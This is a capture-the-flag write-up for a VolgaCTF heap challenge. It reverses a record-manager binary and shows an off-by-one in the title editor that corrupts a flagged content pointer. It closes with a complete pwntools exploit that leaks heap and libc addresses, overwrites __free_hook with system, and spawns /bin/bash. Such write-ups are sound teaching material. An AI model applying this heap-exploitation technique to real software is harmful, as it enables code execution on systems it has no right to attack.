# Description
Thou shalt not extremely waste memory!

N.B. In case you're wondering libc is 2.27.

# First Look
When executing the program we are presented with a textual menu, very typical of pwn challenges.

```
./bin
Welcome!
[S]tore record
[R]eturn record
[U]pdate content
[M]odify title
[D]elete record
[P]rint all
[Q]uit
```

It allows us to manage a list of 'records', each of which has a title and a *content* string.

# Reversed Program
## The Struct
nextPtr is for a linked list, title is a char[8], content is a pointer to a string... Almost. We'll see.
```
00 Record          struc ; (sizeof=0x18)
00 nextPtr         dq ?
08 title           db 8 dup(?)             ; string(C)
10 content         dq ?
18 Record          ends
```

## [S]tore record


### storeRecord()
This function simply takes a title, checks if title isn't already taken, and if it isn't it creates a record, asks us for its content and then inserts it into a linked list of records.
Notice that we can have a **maximum of 10 records**.
```c
signed __int64 storeRecord()
{
  Record *sameTitle; // [rsp+8h] [rbp-28h] BYREF
  Record *newRecord; // [rsp+10h] [rbp-20h]
  char title[9]; // [rsp+1Fh] [rbp-11h] BYREF
  unsigned __int64 v4; // [rsp+128h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( recordNum() <= 9 )
  {
    *title = 0LL;
    title[8] = 0;
    puts("Type title");
    // null byte overflow, should be harmless here
    getStr(title, 9);
    sameTitle = 0LL;
    // this function checks if a title is already taken by a record
    // if it is, returns true and assigns a pointer to the record
    if ( titleAlreadyTaken(title, &sameTitle) )
    {
      puts("Record with such a title has already been added");
    }
    else
    {
      newRecord = callocRecordChunk();
      strcpy(newRecord->title, title);
      insertRecordContent(newRecord);
      if ( linkedListHead )
        newRecord->nextPtr = linkedListHead;
      linkedListHead = newRecord;
    }
  }
  else
  {
    puts("Too many records, delete any");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

### insertRecordContent()
This is where it gets interesting. When the content we insert is 7 bytes long or less, it will be stored right into the content pointer instead of using malloc to store it.
This is basically the **short string optimization** we can see in std::string.
The least significant bit of the content pointer is set to 1, which acts as a 'short string' flag. This can be done because we know `malloc` will never give us odd addresses.
```c
unsigned __int64 __fastcall insertRecordContent(Record *a1)
{
  int i; // [rsp+14h] [rbp-11Ch]
  char contentbuf[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+128h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(contentbuf, 0, 0x100uLL);
  puts("Type content");
  getStr(contentbuf, 0x100);
  // if string fits in 7 bytes, store it in the pointer
  // this is 'short string' mode
  if ( strlen(contentbuf) <= 7 )
  {
    for ( i = 0; i <= 6; ++i )
      // bad disassembly, should be ((char*)content)[i+1]
      a1->title[i + 9] = contentbuf[i];
    // the least relevant byte acts as 'short string mode' flag
    // if lobyte is odd then it's short string mode
    LOBYTE(a1->content) |= 1u;
  }
  else
  {
    // else normal malloc strcpy
    a1->content = malloc(0x100uLL);
    strcpy(a1->content, contentbuf);
  }
  return __readfsqword(0x28u) ^ v4;
}
```

# [D]elete Record
## deleteRecord()
Nothing much to see here. Takes a title, searches for the corresponding chunk, deletes it.
What about the functions it uses though?
```c
unsigned __int64 deleteRecord()
{
  Record *sameTitle; // [rsp+0h] [rbp-20h] BYREF
  char title[9]; // [rsp+Fh] [rbp-11h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  *title = 0LL;
  title[8] = 0;
  puts("Type title");
  getStr(title, 9);
  sameTitle = 0LL;
  if ( titleAlreadyTaken(title, &sameTitle) )
  {
    deleteContent(sameTitle);
    memset(sameTitle->title, 0, sizeof(sameTitle->title));
    removeFromList(sameTitle);
    printf("Delete record with title:%s\n", title);
  }
  else
  {
    puts("Record with such a title hasn't been found");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

## deleteContent()
Here we see again the difference between short string mode and normal record.
It calls free on `content` only if it is not in short string mode.
```c
void *__fastcall deleteContent(Record *a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  // if short string mode
  if ( (a1->content & 1) != 0 )
  {
    for ( i = 0; i <= 6; ++i )
      // bad disassembly, should be ((char*)content)[i+1]
      a1->title[i + 9] = 0;
    // sets all other bits to 1 or 0, sets least important to 0...
    // weird way to do it
    LOBYTE(a1->content) &= 0xFEu;
  }
  // only frees if content does not start with null byte?
  else if ( a1->content && *a1->content )
  {
    free(a1->content);
  }
  // then sets everything to 0 anyway
  return memset(&a1->content, 0, sizeof(a1->content));
}
```

# [U]pdate Content
## updateContent()
Here we can also see important differences in behavior, based on whether the record is 'short string mode' or not.
```c
unsigned __int64 updateContent()
{
  Record *recordcopy; // rbx
  int i; // [rsp+4h] [rbp-13Ch]
  Record *record; // [rsp+8h] [rbp-138h] BYREF
  char title[9]; // [rsp+17h] [rbp-129h] BYREF
  char contentbuf[264]; // [rsp+20h] [rbp-120h] BYREF
  unsigned __int64 v6; // [rsp+128h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  *title = 0LL;
  title[8] = 0;
  puts("Type title");
  getStr(title, 9);
  record = 0LL;
  if ( titleAlreadyTaken(title, &record) )
  {
    memset(contentbuf, 0, 256uLL);
    puts("Type content");
    getStr(contentbuf, 256);
    // if short string mode
    // (least relevant byte not 0)
    if ( (record->content & 1) != 0 )
    {
      // if new content is 'short' again, just write
      if ( strlen(contentbuf) <= 7 )
      {
        for ( i = 0; i <= 6; ++i )
          record->title[i + 9] = contentbuf[i];
        LOBYTE(record->content) |= 1u;
      }
      else
      {
        // else malloc
        recordcopy = record;
        recordcopy->content = malloc(0x100uLL);
        strcpy(record->content, contentbuf);
      }
    }
    else
    {
      // if record is not short string mode,  
      // put the new content on the already existing chunk
      // regardless of length
      memset(record->content, 0, 0x100uLL);
      strcpy(record->content, contentbuf);
    }
  }
  else
  {
    puts("Record with such a title hasn't been found");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

## [M]odify Title (and vulnerability)
And finally, this is where we find the vulnerability we will use in the exploit.
There is an off by one in the function to modify the title! The title is placed right before the `content` field, so we can modify the least relevant byte of it (thanks to little endian order).

```c
unsigned __int64 modifyTitle()
{
  int i; // [rsp+4h] [rbp-3Ch]
  Record *record; // [rsp+8h] [rbp-38h] BYREF
  char title[9]; // [rsp+17h] [rbp-29h] BYREF
  char titlebuf[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *title = 0LL;
  title[8] = 0;
  puts("Type title");
  getStr(title, 9);
  record = 0LL;
  if ( titleAlreadyTaken(title, &record) )
  {
    *titlebuf = 0LL;
    *&titlebuf[8] = 0LL;
    puts("Type new title");
    // getStr is a wrapper to fgets
    getStr(titlebuf, 16);
    memset(record->title, 0, sizeof(record->title));
    // one byte overflow
    // might not have null terminator
    for ( i = 0; i <= 8; ++i )
      record->title[i] = titlebuf[i];
  }
  else
  {
    puts("Record with such a title hasn't been found");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

# Exploit
Here is the gist of the exploit:
- Keep a 'short string mode' record
- Fill the tcache with 'normal mode' records and get to unsorted bin to leak pointers to libc
- Use the title overflow to leak heap from one of the normal records
- Update content of short string record to a pointer to leak libc
- Use the title overflow to change the short string mode record into a normal record, then read from it (leaking libc)
- Use the title overflow to change the record back into short string mode
- Update content of short string record to a pointer to free hook
- Use the title overflow to change the short string mode record into a normal record, then write to it (with system)
- Free a `/bin/bash` string, getting shell

```python
# small string record
store_record('short', 'lol')

# prep for libc leak
# I want 8 chunks with 0x100 malloc content (long strings)
for x in range(8):
    store_record(str(x), 'lolaaaaaaaaaaaaaaaa')

# then one 'end' chunk to block 
# the others from being merged with top chunk
store_record('end', 'bruh')

# heap leak
# modify title, removing the null terminator
# we have to use one of the malloc strings chunks
# Also we use 'print all' because we need to print the title,
# Return record won't do
modify_title('0', 'b'*9)
print_all()
io.recvuntil('b'*9)
heap_base = u64(b'\x00' + io.recv(5) + b'\x00\x00') & 0xFFFFFFFFFFFFF000
log.info(f'Heap Base: {hex(heap_base)}')

# Put the title and the 'short string' byte back to normal
# We need to do this or we won't be able to fill the 0x110 bin
modify_title('b'*8, '0' + '\x00'*7 + '\xa0')

# Fill the 0x110 tcache bin and put one on the unsorted bin
# The unsorted bin chunk will have pointers to libc main arena
for x in range(8):
    delete_record(str(x))

# Recover the libc leak
libc_leak_addr = heap_base + 0xaf0 # found with gdb

# Use shortstring to place 7 bytes of the address
new_content = p64(libc_leak_addr)[1:]
modify_content('short', new_content)

# Use the overflow on the title to set the
# least important byte of the nextptr, removing the shortstring flag
# and placing the remaining byte of the address to leak
new_title = 'short' + '\x00'*3 + chr(libc_leak_addr & 0xFF)
modify_title('short', new_title)

# Now 'short' is actually a malloc record, and its content will
# give us libc leak. Let's recover it.
return_record('short')
libc.address = u64(io.recv(6) + b'\x00\x00') - \
    (0x7fe47906bca0 - 0x7fe478c80000) # found with gdb
log.info(f'Libc Base: {hex(libc.address)}')

# make 'short' a short string record again
new_title = 'short' + '\x00'*3 + '\x01'
modify_title('short', new_title)

# set up a chunk to store the shell command
store_record('shell', '/bin/bash\x00' + 'a'*10)

# modify free hook, using pretty much
# the same technique we used to leak libc
# Except instead of reading the content,
# we write to it. the content will be free_hook
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
new_content = p64(free_hook)[1:]
new_title = 'short' + '\x00'*3 + chr(free_hook & 0xFF)
modify_content('short', new_content)
modify_title('short', new_title)
modify_content('short', p64(system))

# Call shell command
delete_record('shell')
io.interactive() # VolgaCTF{N1cke1_unD_d!mE_a_b!t}
```